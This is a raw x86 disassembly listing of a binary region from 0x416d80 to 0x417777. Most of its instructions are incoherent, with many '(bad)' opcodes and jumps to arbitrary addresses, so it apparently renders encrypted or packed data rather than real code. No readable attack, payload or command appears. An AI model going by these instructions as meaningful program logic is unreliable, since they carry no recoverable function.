  416d80:	xchg   edx,eax
  416d81:	iret   
  416d82:	jne    0x416d4e
  416d84:	pop    eax
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    al,0x1
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	or     al,0x4e
  416d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d8f:	js     0x416dd6
  416d91:	push   esp
  416d92:	cli    
  416d93:	push   0x6e
  416d95:	in     al,0xcd
  416d97:	imul   edx,DWORD PTR [esi+0x41],0x93202c48
  416d9e:	xchg   ebx,eax
  416d9f:	in     al,dx
  416da0:	iret   
  416da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416da2:	ret    
  416da3:	je     0x416dae
  416da5:	fdiv   QWORD PTR [ebp+0x10]
  416da8:	pop    esp
  416da9:	outs   dx,BYTE PTR ds:[esi]
  416daa:	js     0x416e0c
  416dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dad:	cli    
  416dae:	mov    ds:0xbff3ee06,al
  416db3:	clc    
  416db4:	retf   
  416db5:	push   esp
  416db6:	jmp    0x37f27dd5
  416dbb:	into   
  416dbc:	stos   BYTE PTR es:[edi],al
  416dbd:	cmp    cl,ah
  416dbf:	das    
  416dc0:	and    ebx,edx
  416dc2:	dec    ebx
  416dc3:	lds    ebp,FWORD PTR [eax+0x562a4bec]
  416dc9:	mov    cl,0xf2
  416dcb:	adc    bl,dl
  416dcd:	sub    ch,BYTE PTR [edi-0x20782c89]
  416dd3:	clc    
  416dd4:	jp     0x416d59
  416dd6:	shr    DWORD PTR [esi],0xe7
  416dd9:	xchg   edx,eax
  416dda:	cld    
  416ddb:	inc    esp
  416ddc:	mov    edx,0x8900460f
  416de1:	inc    eax
  416de2:	test   DWORD PTR [ecx-0x437bd29],ecx
  416de8:	pop    ebx
  416de9:	jp     0x416dec
  416deb:	(bad)  
  416ded:	loop   0x416e01
  416def:	sbb    al,0x5
  416df1:	shr    DWORD PTR [ebx],1
  416df3:	test   eax,0x7d30a136
  416df8:	pop    ss
  416df9:	push   edi
  416dfa:	adc    BYTE PTR [esi],bh
  416dfc:	cli    
  416dfd:	mov    cl,bh
  416dff:	adc    eax,0x22b14e5
  416e04:	add    al,BYTE PTR ds:0x4c24bcb7
  416e0a:	mov    esp,0x4dd33caf
  416e0f:	rol    DWORD PTR [esi-0x29235c89],1
  416e15:	xchg   BYTE PTR [eax-0x6f523d0f],ch
  416e1b:	fdivr  QWORD PTR [edx]
  416e1d:	sbb    ch,BYTE PTR ds:0xa8572613
  416e23:	cmp    bl,bh
  416e25:	sbb    al,0x25
  416e27:	pop    edi
  416e28:	jne    0x416df7
  416e2a:	cli    
  416e2b:	xor    DWORD PTR [edx+0x3a],0x51e316e6
  416e32:	sbb    al,0x53
  416e34:	das    
  416e35:	ds out 0x8b,eax
  416e38:	mov    ecx,0x18a61f7c
  416e3d:	sbb    eax,0x724e7bba
  416e42:	adc    al,0xf
  416e44:	cmp    DWORD PTR [ecx],esp
  416e46:	fist   WORD PTR [ecx]
  416e48:	cli    
  416e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e4a:	sahf   
  416e4b:	pop    eax
  416e4c:	out    dx,eax
  416e4d:	jo     0x416e5b
  416e4f:	mov    esi,0xebfedcbd
  416e54:	ret    0x9bf2
  416e57:	push   es
  416e58:	mov    DWORD PTR [ebx-0x6c],esi
  416e5b:	dec    edx
  416e5c:	mov    edi,0x14be725c
  416e61:	mov    cl,BYTE PTR [edi+ebp*1-0x76f1288e]
  416e68:	(bad)  
  416e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e6b:	imul   ebx,DWORD PTR fs:0x34aff940,0x74091a44
  416e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e77:	jl     0x416ecd
  416e79:	into   
  416e7a:	pop    ebx
  416e7b:	pop    ebp
  416e7c:	sbb    bh,BYTE PTR [ebx-0x75d0dc72]
  416e82:	adc    DWORD PTR [ebp+esi*4+0x4],edi
  416e86:	cmp    esi,DWORD PTR [esi+0x59]
  416e89:	(bad)  
  416e8b:	into   
  416e8c:	hlt    
  416e8d:	dec    esi
  416e8e:	sbb    DWORD PTR [ebx],edi
	...
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0xb34b8eea
  416f02:	lods   eax,DWORD PTR ds:[esi]
  416f03:	fstp   DWORD PTR [edx+esi*8+0x0]
  416f07:	add    BYTE PTR [ecx+eax*1],al
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	fdivr  QWORD PTR [eax]
  416f0e:	push   edx
  416f0f:	test   al,0x8a
  416f11:	arpl   WORD PTR [edx],sp
  416f13:	fsubr  st(6),st
  416f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f16:	xchg   edx,eax
  416f17:	xadd   BYTE PTR [eax-0x10b6791d],dh
  416f1e:	popa   
  416f1f:	test   DWORD PTR [edi-0x6605df7f],ecx
  416f25:	out    dx,al
  416f26:	dec    edi
  416f27:	mov    dh,0x4b
  416f29:	out    0x74,al
  416f2b:	push   0xf45c03f7
  416f30:	mov    ebp,0xb3a33e34
  416f35:	push   0xffffffa4
  416f37:	jle    0x416f22
  416f39:	ror    BYTE PTR [esi],cl
  416f3b:	(bad)  
  416f3c:	xor    al,0x5b
  416f3e:	lods   eax,DWORD PTR ds:[esi]
  416f3f:	and    eax,DWORD PTR [edi-0x34]
  416f42:	imul   eax,DWORD PTR [eax+ebx*2-0x7],0xa05a8c5d
  416f4a:	ret    
  416f4b:	stos   DWORD PTR es:[edi],eax
  416f4c:	add    al,0xc8
  416f4e:	pop    ecx
  416f4f:	cmp    BYTE PTR [edi],dl
  416f51:	or     esp,ecx
  416f53:	neg    BYTE PTR [edx-0x72]
  416f56:	mov    ebx,0xce54da70
  416f5b:	pusha  
  416f5c:	icebp  
  416f5d:	inc    edx
  416f5e:	(bad)  
  416f5f:	cwde   
  416f60:	add    ch,bl
  416f62:	shl    BYTE PTR [esi-0x25555953],0x9d
  416f69:	fwait
  416f6a:	adc    eax,ebx
  416f6c:	leave  
  416f6d:	mov    al,0x5e
  416f6f:	xor    ebx,esi
  416f71:	push   eax
  416f72:	(bad)  
  416f73:	icebp  
  416f74:	xchg   edi,eax
  416f75:	jmp    0xe7f1a5e8
  416f7a:	mov    ebp,0xeaa7c8e0
  416f7f:	pop    ebp
  416f80:	mov    ecx,0x3f54ab22
  416f85:	and    ch,bh
  416f87:	xchg   esi,eax
  416f88:	pop    ebx
  416f89:	adc    eax,0x3f3135a1
  416f8e:	shl    DWORD PTR [ecx+0x2c8b02f],0x58
  416f95:	cmp    BYTE PTR [edx+ebp*2],dh
  416f98:	clc    
  416f99:	push   ebp
  416f9a:	mov    ds:0x4cae5d6c,al
  416f9f:	pop    ss
  416fa0:	fmul   QWORD PTR [eax]
  416fa2:	outs   dx,BYTE PTR ds:[esi]
  416fa3:	(bad)  
  416fa4:	pop    eax
  416fa5:	int3   
  416fa6:	cmp    al,0x28
  416fa8:	scas   eax,DWORD PTR es:[edi]
  416fa9:	xchg   DWORD PTR [eax],esi
  416fab:	and    eax,0x29800ee
  416fb0:	dec    eax
  416fb1:	mov    esi,0x6eb1f91c
  416fb6:	pop    esi
  416fb7:	inc    ecx
  416fb8:	(bad)  
  416fb9:	inc    esp
  416fba:	mov    ds:0x87388986,eax
  416fbf:	shl    DWORD PTR [ebx],1
  416fc1:	hlt    
  416fc2:	cmp    ebx,esp
  416fc4:	dec    ebp
  416fc5:	out    dx,al
  416fc6:	enter  0x8f2b,0x27
  416fca:	inc    ecx
  416fcb:	(bad)  
  416fcc:	mov    ch,0x86
  416fce:	stos   DWORD PTR es:[edi],eax
  416fcf:	repnz daa 
  416fd1:	retf   
  416fd2:	lds    eax,FWORD PTR [ecx+0x26]
  416fd5:	xor    BYTE PTR [edi-0x4d476d27],0xd7
  416fdc:	mov    ds:0x9f302362,al
  416fe1:	or     BYTE PTR [esi],bh
  416fe3:	mov    bl,0x19
  416fe5:	xor    al,0xf1
  416fe7:	adc    ah,BYTE PTR [ecx]
  416fe9:	arpl   WORD PTR [esi],cx
  416feb:	stos   DWORD PTR es:[edi],eax
  416fec:	sub    cl,BYTE PTR [ebp+0x7e39456]
  416ff2:	retf   0x54d8
  416ff5:	xor    ecx,DWORD PTR [edx]
  416ff7:	or     dh,ah
  416ff9:	scas   al,BYTE PTR es:[edi]
  416ffa:	dec    ecx
  416ffb:	leave  
  416ffc:	jae    0x416ff2
  416ffe:	shl    ecx,0x19
  417001:	sub    DWORD PTR [edi+eax*1-0x1e],esp
  417005:	pop    ds
  417006:	ror    BYTE PTR [esi+0x1bf5d53e],cl
  41700c:	popf   
  41700d:	or     cl,0x83
	...
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    edi,DWORD PTR [eax+esi*4]
  417082:	mov    dh,BYTE PTR [eax+eiz*2+0x40000f3]
  417089:	add    DWORD PTR [eax],eax
  41708b:	add    BYTE PTR [eax+0x45],bh
  41708e:	pushfw 
  417090:	xor    bl,0x9d
  417093:	mov    eax,ds:0xbbdd8bf2
  417098:	call   0xdae7:0xbab3e3d2
  41709f:	jmp    0xbfc1:0x12bdb2e6
  4170a6:	xor    eax,0x36bb4f5d
  4170ab:	pop    eax
  4170ac:	addr16 cwde 
  4170ae:	pop    eax
  4170af:	loop   0x417114
  4170b1:	and    BYTE PTR [edi-0x42],0xe1
  4170b5:	mov    ds:0x2cac5839,eax
  4170ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170bb:	or     eax,0xee64c349
  4170c0:	pop    es
  4170c1:	mov    esi,0x77d8d191
  4170c6:	jmp    0x417133
  4170c8:	add    ah,dh
  4170ca:	retf   0x8c62
  4170cd:	pop    esp
  4170ce:	sub    BYTE PTR [edx-0x72],0x72
  4170d2:	mov    DWORD PTR [ebx+eiz*1],0x64f9fdcf
  4170d9:	pop    esp
  4170da:	xchg   BYTE PTR [edx],al
  4170dc:	sub    esi,DWORD PTR [eax-0x51ca1664]
  4170e2:	push   ds
  4170e3:	imul   esi,DWORD PTR [ebx+0x6f6fe3ad]
  4170ea:	cmp    al,0x24
  4170ec:	lds    edi,FWORD PTR [esp+ebx*2-0xe]
  4170f0:	arpl   WORD PTR [eax-0x11],dx
  4170f3:	lea    ecx,[edi]
  4170f5:	lods   al,BYTE PTR ds:[esi]
  4170f6:	in     eax,0x95
  4170f8:	lds    edi,FWORD PTR [edx]
  4170fa:	retf   0x5c8e
  4170fd:	xchg   edi,edi
  4170ff:	mov    BYTE PTR [ebx+0x43],al
  417102:	sbb    cl,ah
  417104:	aas    
  417105:	ins    DWORD PTR es:[edi],dx
  417106:	icebp  
  417107:	imul   ecx,esp,0xffffffc0
  41710a:	out    0xcd,eax
  41710c:	jb     0x417120
  41710e:	xchg   edi,eax
  41710f:	call   0x9a414a59
  417114:	data16 fwait
  417116:	cmp    BYTE PTR [ecx-0x23a1424],0x2a
  41711d:	mov    ebp,DWORD PTR [esi+0x12]
  417120:	iret   
  417121:	into   
  417122:	mov    ah,0x64
  417124:	mov    bh,0x7e
  417126:	int3   
  417127:	js     0x4170c8
  417129:	and    eax,0xb44d08fe
  41712e:	adc    al,0x9
  417130:	jle    0x417199
  417132:	sbb    al,0x12
  417134:	xchg   ebx,eax
  417135:	xor    dh,BYTE PTR [edx+0x4cdf8f5d]
  41713b:	sbb    eax,0x828cd655
  417140:	sbb    eax,0x6a72441b
  417145:	mov    gs,WORD PTR [eax+ebp*8-0x2a]
  417149:	sub    bl,BYTE PTR gs:[ebp+0x2e21e27b]
  417150:	(bad)  
  417151:	push   eax
  417152:	sbb    al,0x4d
  417154:	aam    0x5
  417156:	mov    eax,0xa559b658
  41715b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41715c:	push   esi
  41715d:	outs   dx,BYTE PTR ds:[esi]
  41715e:	add    al,0x8a
  417160:	pop    edi
  417161:	ret    0x2ad0
  417164:	jo     0x41713a
  417166:	rcl    BYTE PTR [edi],cl
  417168:	in     al,dx
  417169:	cmp    DWORD PTR [edi+0x2839fb66],eax
  41716f:	mov    ?,WORD PTR ss:[ebx]
  417172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417173:	xchg   BYTE PTR [eax],ch
  417175:	(bad)  
  417176:	dec    ebp
  417177:	int    0x62
  417179:	(bad)  
  41717a:	mov    ds:0x74b0b39a,eax
  41717f:	retf   
  417180:	adc    eax,0xabf18c9b
  417185:	mov    al,0xe9
  417187:	push   esi
  417188:	lahf   
  417189:	test   DWORD PTR [edx-0x36],esi
  41718c:	and    eax,0xe24ef5
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	jno    0x417226
  417202:	icebp  
  417203:	int    0x64
  417205:	hlt    
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	fs aas 
  41720e:	lock dec esi
  417210:	and    al,0x56
  417212:	and    ch,dl
  417214:	add    ecx,DWORD PTR [edx-0x7d]
  417217:	push   edx
  417218:	sahf   
  417219:	pop    es
  41721a:	stos   BYTE PTR es:[edi],al
  41721b:	fld    QWORD PTR [edx-0x4c998647]
  417221:	test   BYTE PTR [edx+0x3f],dl
  417224:	daa    
  417225:	data16 lock aas 
  417228:	adc    BYTE PTR fs:[eax+0x18],dh
  41722c:	mov    cl,0x29
  41722e:	or     ebx,esi
  417230:	dec    ebx
  417231:	inc    eax
  417232:	fwait
  417233:	sub    al,0x4c
  417235:	fistp  QWORD PTR [ebx]
  417237:	xor    bl,bl
  417239:	cmp    al,0xc5
  41723b:	inc    esi
  41723c:	cmp    BYTE PTR [eax+0x52],dh
  41723f:	in     al,dx
  417240:	mov    bh,0xeb
  417242:	jp     0x4172a1
  417244:	ss pop ebp
  417246:	sub    esi,DWORD PTR [esi]
  417248:	(bad)  
  417249:	jbe    0x417208
  41724b:	jmp    0x6ad5ea5e
  417250:	cdq    
  417251:	sbb    BYTE PTR [eax+0x59],ah
  417254:	lock sti 
  417256:	cmp    al,0xdf
  417258:	inc    ecx
  417259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41725a:	push   edi
  41725b:	jmp    0x41726e
  41725d:	in     al,dx
  41725e:	sub    al,0x70
  417260:	ins    BYTE PTR es:[edi],dx
  417261:	push   edx
  417262:	and    ch,dl
  417264:	imul   esi,DWORD PTR [ecx+0x4e],0xfffffff8
  417268:	aaa    
  417269:	lods   eax,DWORD PTR cs:[esi]
  41726b:	ret    0xcfbe
  41726e:	mov    ecx,0x8e7c5f89
  417273:	pop    ds
  417274:	mov    ecx,0x4ffed71c
  417279:	mov    ah,0xde
  41727b:	loop   0x4171fe
  41727d:	mov    ah,0xb0
  41727f:	mov    DWORD PTR [ebp+0xe],eax
  417282:	dec    ebp
  417283:	and    ebx,DWORD PTR [edi]
  417285:	shl    esi,1
  417287:	lods   al,BYTE PTR ds:[esi]
  417288:	(bad)  
  417289:	loopne 0x41725b
  41728b:	pop    esi
  41728c:	mov    esi,0x5b78826e
  417291:	xchg   DWORD PTR [ebp+0x7e2c6a6b],esi
  417297:	cdq    
  417298:	outs   dx,DWORD PTR ds:[esi]
  417299:	push   0xfffffff4
  41729b:	pop    ebp
  41729c:	in     eax,0x7b
  41729e:	push   ebp
  4172a0:	test   al,0x2b
  4172a2:	push   ss
  4172a3:	cmp    edx,DWORD PTR [edx+0x253df69a]
  4172a9:	xchg   edx,eax
  4172aa:	(bad)  [eax+0x9d642c5]
  4172b0:	push   0x10f9522c
  4172b5:	or     BYTE PTR [bx+0x7c2b],0x4e
  4172bb:	push   0x74dee570
  4172c0:	mov    bl,0x42
  4172c2:	jle    0x41728b
  4172c4:	js     0x4172c0
  4172c6:	(bad)  
  4172c8:	mov    edx,0x53cdddad
  4172cd:	mov    al,0x19
  4172cf:	dec    esi
  4172d0:	mov    eax,ds:0xc376e88d
  4172d5:	xor    dh,BYTE PTR [eax-0x505b812b]
  4172db:	ss aad 0x88
  4172de:	inc    ecx
  4172df:	dec    DWORD PTR [ecx]
  4172e1:	xchg   esp,eax
  4172e2:	stc    
  4172e3:	adc    eax,0xff7a1c99
  4172e8:	inc    ecx
  4172e9:	jno    0x4172f8
  4172eb:	repz das 
  4172ed:	inc    esi
  4172ee:	push   ebp
  4172ef:	dec    esp
  4172f0:	cmp    BYTE PTR [edx+0x33],dh
  4172f3:	mov    ah,0x6e
  4172f5:	shl    BYTE PTR [eax+0x1d935cac],0x83
  4172fc:	add    cl,bl
  4172fe:	and    al,0x92
  417300:	mov    ds,WORD PTR [ebp-0x7973c88f]
  417306:	xchg   ecx,eax
  417307:	jmp    0x58a0:0x5bdb406c
  41730e:	(bad)  
  41730f:	aad    0x0
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	or     DWORD PTR [ecx],ecx
  417382:	shl    BYTE PTR [eax+ebp*2-0xb],0x0
  417387:	add    BYTE PTR [ecx+eax*1],al
  41738a:	add    BYTE PTR [eax],al
  41738c:	or     DWORD PTR [ebx+0x2cdbd1f6],esp
  417392:	xchg   BYTE PTR [ecx-0x5d],bl
  417395:	push   eax
  417396:	xchg   esp,eax
  417397:	or     BYTE PTR [ebx-0x35],bh
  41739a:	xchg   edx,eax
  41739b:	pop    es
  41739c:	xchg   ecx,eax
  41739d:	(bad)  
  41739e:	mov    edx,0xf2c2c08a
  4173a3:	std    
  4173a4:	sub    BYTE PTR [edi-0x3],cl
  4173a7:	repnz ins BYTE PTR es:[edi],dx
  4173a9:	push   ds
  4173aa:	lock cmovbe ebx,DWORD PTR [esi]
  4173ae:	add    eax,0xd5b6266
  4173b3:	js     0x4173aa
  4173b5:	ret    0x8a77
  4173b8:	lds    ecx,FWORD PTR [ebx+0x25]
  4173bb:	mov    bh,0x6f
  4173bd:	push   0x8699b163
  4173c2:	jne    0x41736e
  4173c4:	scas   eax,DWORD PTR es:[edi]
  4173c5:	ja     0x4173f6
  4173c7:	mov    bh,0xa3
  4173c9:	push   0xffffffdc
  4173cb:	jae    0x417350
  4173cd:	pushf  
  4173ce:	cmp    bh,BYTE PTR [eax+0x38]
  4173d1:	aas    
  4173d2:	dec    ecx
  4173d3:	test   al,0x17
  4173d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173d6:	add    al,BYTE PTR [eax+edx*8-0x5e]
  4173da:	dec    edx
  4173db:	fnstcw WORD PTR [edx]
  4173dd:	mov    eax,DWORD PTR [ebx+eax*8+0x6583b1b9]
  4173e4:	pop    edi
  4173e5:	fmul   st,st(0)
  4173e7:	pop    esp
  4173e8:	sbb    esp,DWORD PTR [ebp+0x4a59b98d]
  4173ee:	sbb    BYTE PTR [edx],dh
  4173f0:	or     al,al
  4173f2:	sbb    al,0xea
  4173f4:	cmp    eax,DWORD PTR [ecx]
  4173f6:	xchg   edx,eax
  4173f7:	xchg   ebx,eax
  4173f8:	(bad)  
  4173f9:	lea    esi,[esi+0x52]
  4173fc:	test   DWORD PTR [esi],edi
  4173fe:	out    dx,eax
  4173ff:	test   DWORD PTR [ecx+0x589b3ca1],0xf0d7d480
  417409:	and    esi,ecx
  41740b:	xor    BYTE PTR [ecx-0x1b740ea3],dl
  417411:	jns    0x4173b4
  417413:	sbb    ebp,ecx
  417415:	push   cs
  417416:	aam    0xc0
  417418:	adc    BYTE PTR ds:0xbdab88a9,bl
  41741e:	push   ebp
  41741f:	stos   DWORD PTR es:[edi],eax
  417420:	retf   0xff71
  417423:	jmp    0x417465
  417425:	mov    ebp,0xf41aea65
  41742a:	jge    0x41749f
  41742c:	test   al,0xf2
  41742e:	mov    ebp,0xd77cd130
  417433:	push   edx
  417434:	mov    bh,0xc8
  417436:	push   ebx
  417437:	mov    al,ds:0xbfeeb7d1
  41743c:	push   edi
  41743d:	shr    BYTE PTR [ecx+ebx*4+0x5],cl
  417441:	std    
  417442:	jecxz  0x417489
  417444:	out    0x26,al
  417446:	xchg   ebp,eax
  417447:	imul   ebp,DWORD PTR [edi-0x17],0xbd210059
  41744e:	fs scas eax,DWORD PTR es:[edi]
  417450:	stc    
  417451:	arpl   WORD PTR [esi],bx
  417453:	sub    eax,0x649a719f
  417458:	push   eax
  417459:	lahf   
  41745a:	hlt    
  41745b:	cmc    
  41745c:	push   ss
  41745d:	ds mov edx,eax
  417460:	scas   al,BYTE PTR es:[edi]
  417461:	and    al,dh
  417463:	xchg   DWORD PTR [edi],ebp
  417465:	fdiv   st,st(5)
  417467:	pop    edi
  417468:	or     al,0x47
  41746a:	adc    bh,cl
  41746c:	cli    
  41746d:	mov    ecx,0x5a5ffa4a
  417472:	jnp    0x4174db
  417474:	or     al,0x3a
  417476:	dec    edi
  417477:	rcr    bl,0xd5
  41747a:	out    0x1,al
  41747c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41747d:	mov    ebp,0x72ef3f97
  417482:	xchg   edx,eax
  417483:	bound  eax,QWORD PTR [eax-0x1f27d0f0]
  417489:	sub    esp,DWORD PTR [edi+0x739ad9d8]
  41748f:	jae    0x417491
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	mov    esi,0x6c3af163
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    al,0x1
  41750a:	add    BYTE PTR [eax],al
  41750c:	test   esp,ecx
  41750e:	or     eax,0x22f1c9d3
  417513:	leave  
  417514:	inc    ebp
  417515:	and    DWORD PTR [esi],ebx
  417517:	jge    0x4174e2
  417519:	dec    ecx
  41751a:	outs   dx,DWORD PTR ds:[esi]
  41751b:	or     DWORD PTR [edx-0x10c7c859],0xffffffe4
  417522:	or     eax,0xbfb51b0d
  417527:	popf   
  417528:	vpsllq ymm6,ymm1,XMMWORD PTR [esi-0x52]
  41752d:	mov    cl,0x26
  41752f:	sbb    eax,0x12c66286
  417534:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417536:	push   ebx
  417537:	mov    ecx,0x8cc6d6bb
  41753c:	push   cs
  41753d:	jnp    0x41753a
  41753f:	push   es
  417540:	cmp    eax,0x9aad0aa1
  417545:	mov    dh,0xa5
  417547:	jl     0x4174d5
  417549:	jb     0x417519
  41754b:	outs   dx,BYTE PTR ds:[esi]
  41754c:	pop    esi
  41754d:	add    eax,0xdf83e8fb
  417552:	pop    eax
  417553:	ror    BYTE PTR [edx+0x4d],1
  417556:	mov    ebx,0x8f6c42b0
  41755b:	fdivr  QWORD PTR [ecx]
  41755d:	sahf   
  41755e:	aas    
  41755f:	fbld   TBYTE PTR [ecx]
  417561:	push   eax
  417562:	ror    DWORD PTR [esi-0x6e],0x2c
  417566:	cmc    
  417567:	cld    
  417568:	call   0x5304:0x552124b7
  41756f:	jnp    0x417589
  417571:	les    ebx,FWORD PTR [esi]
  417573:	lock push 0x75dcc25b
  417579:	ja     0x417596
  41757b:	popf   
  41757c:	push   edx
  41757d:	es dec edi
  41757f:	lahf   
  417580:	into   
  417581:	pushf  
  417582:	cmp    DWORD PTR [edi+0xf0a8d3b],eax
  417588:	add    BYTE PTR [edi-0x3150fac0],cl
  41758e:	mov    dl,0x50
  417590:	into   
  417591:	adc    DWORD PTR [ecx+0x4e],eax
  417594:	jmp    0x8890b46
  417599:	sbb    BYTE PTR [eax+0x5a6264fd],cl
  41759f:	lods   eax,DWORD PTR ds:[esi]
  4175a0:	out    dx,eax
  4175a1:	call   0x26053a7a
  4175a6:	cmp    esi,DWORD PTR [eax+edx*1-0x1b6859b0]
  4175ad:	sub    BYTE PTR [edx-0x59],ah
  4175b0:	push   edi
  4175b1:	or     ecx,ebp
  4175b3:	imul   esi,DWORD PTR [ebx+0x51ba9a94],0xfffffff5
  4175ba:	cli    
  4175bb:	cmp    esp,0xb5ced1e9
  4175c1:	outs   dx,DWORD PTR ds:[esi]
  4175c2:	xchg   ecx,eax
  4175c3:	sub    edx,DWORD PTR ds:0xf8f9fffc
  4175c9:	pop    esi
  4175ca:	test   BYTE PTR [eax+0x2fc2e0be],bl
  4175d0:	and    BYTE PTR [edx+ecx*8],ch
  4175d3:	and    eax,0x249a32f4
  4175d8:	mov    dl,0x9c
  4175da:	and    ebp,esi
  4175dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175dd:	rcl    DWORD PTR [esi],cl
  4175df:	iret   
  4175e0:	dec    eax
  4175e1:	cmp    ch,BYTE PTR [edx+0x7757e73]
  4175e7:	jg     0x417660
  4175e9:	pop    ebx
  4175ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175eb:	daa    
  4175ec:	jo     0x41766a
  4175ee:	test   al,0xc4
  4175f0:	(bad)  
  4175f1:	scas   al,BYTE PTR es:[edi]
  4175f2:	leave  
  4175f3:	push   edi
  4175f4:	cli    
  4175f5:	jg     0x417664
  4175f7:	push   esp
  4175f8:	or     edx,DWORD PTR [eax]
  4175fa:	add    al,0x55
  4175fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175fd:	xor    BYTE PTR [ebx+0x1d],0x3d
  417601:	loop   0x4175c3
  417603:	sar    ah,1
  417605:	inc    ecx
  417606:	jo     0x41767e
  417608:	xchg   ebx,eax
  417609:	mov    esp,0x48a383f
  41760e:	ds ja  0x417611
	...
  417671:	add    BYTE PTR [eax],al
  417673:	add    BYTE PTR [ecx-0x20b02c99],ch
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fimul  DWORD PTR [ecx]
  417681:	ins    DWORD PTR es:[edi],dx
  417682:	inc    esp
  417683:	ds jo  0x41767d
  417686:	add    BYTE PTR [eax],al
  417688:	add    al,0x1
  41768a:	add    BYTE PTR [eax],al
  41768c:	out    dx,al
  41768d:	(bad)  
  41768e:	out    0x85,eax
  417690:	and    ecx,ecx
  417692:	adc    ch,al
  417694:	xchg   DWORD PTR [edx-0x1d],ebp
  417697:	xchg   BYTE PTR [esi-0x7],dl
  41769a:	sbb    eax,0x421ee981
  41769f:	sub    esi,esi
  4176a1:	cwde   
  4176a2:	mov    esi,0x8dd6d8a7
  4176a7:	mov    edi,DWORD PTR [esi-0xe616626]
  4176ad:	loop   0x417669
  4176af:	retf   0xf53d
  4176b2:	or     ah,ah
  4176b4:	add    eax,edi
  4176b6:	clc    
  4176b7:	xchg   esp,eax
  4176b8:	xchg   bl,ah
  4176ba:	loope  0x417713
  4176bc:	rol    ebx,1
  4176be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176bf:	xchg   esi,eax
  4176c0:	ror    DWORD PTR [ebp-0x17a17d2d],0x88
  4176c7:	add    bl,BYTE PTR [edx-0x3d]
  4176ca:	scas   eax,DWORD PTR es:[edi]
  4176cb:	lds    eax,FWORD PTR [esi-0x19b7eaff]
  4176d1:	mov    al,ds:0x9f076e96
  4176d6:	or     dl,BYTE PTR [edx+edx*2+0x40ffeb70]
  4176dd:	xor    al,cl
  4176df:	push   edx
  4176e0:	in     al,0x69
  4176e2:	cmp    esp,DWORD PTR [ebx]
  4176e4:	dec    ecx
  4176e5:	jmp    0xd23c:0xd46ab803
  4176ec:	cld    
  4176ed:	add    esp,DWORD PTR [ebp+edi*4+0x33]
  4176f1:	in     eax,0x32
  4176f3:	fstp   DWORD PTR [edi]
  4176f5:	ret    0xbfe7
  4176f8:	loop   0x41769c
  4176fa:	pop    ecx
  4176fb:	and    esi,0xffffffca
  4176fe:	fdiv   DWORD PTR ds:0x9b88ca09
  417704:	pushf  
  417705:	add    dh,ch
  417707:	and    eax,0xfb9908bc
  41770c:	cmp    ebx,DWORD PTR [edx-0x2c]
  41770f:	xor    eax,0xa288792a
  417714:	aad    0xd0
  417716:	cmp    DWORD PTR [edx+0x51e12e9a],esp
  41771c:	call   0xb6d4048f
  417721:	aad    0xd0
  417723:	add    ecx,DWORD PTR ds:0x6246cf07
  417729:	(bad)  
  41772a:	stc    
  41772b:	repnz push 0x549d65a1
  417731:	jae    0x4176be
  417733:	clc    
  417734:	pop    esp
  417735:	rol    BYTE PTR [ecx+0x68],0x14
  417739:	fdiv   QWORD PTR [edx+0x3cffba77]
  41773f:	dec    eax
  417740:	sub    edi,DWORD PTR [edi]
  417742:	mov    ah,BYTE PTR [ebp-0x5]
  417745:	cs push ebx
  417747:	inc    esi
  417748:	xchg   esp,eax
  417749:	xchg   ebp,eax
  41774a:	xor    ebp,esp
  41774c:	ds and ch,bl
  41774f:	aas    
  417750:	sub    BYTE PTR [ebx+0x79bbd41d],0x85
  417757:	mov    dh,BYTE PTR [ebx]
  417759:	arpl   WORD PTR [edi-0x15790a08],bx
  41775f:	mov    ebp,0x47923a90
  417764:	sbb    ecx,DWORD PTR [edx]
  417766:	loop   0x417790
  417768:	cld    
  417769:	sub    esi,DWORD PTR [ebp-0xb0a279d]
  41776f:	mov    bl,0xd7
  417771:	xchg   ebp,eax
  417772:	leave  
  417773:	push   cs
  417774:	xor    ch,bh
  417776:	inc    ebp
  417777:	jmp    0xd2b5c025
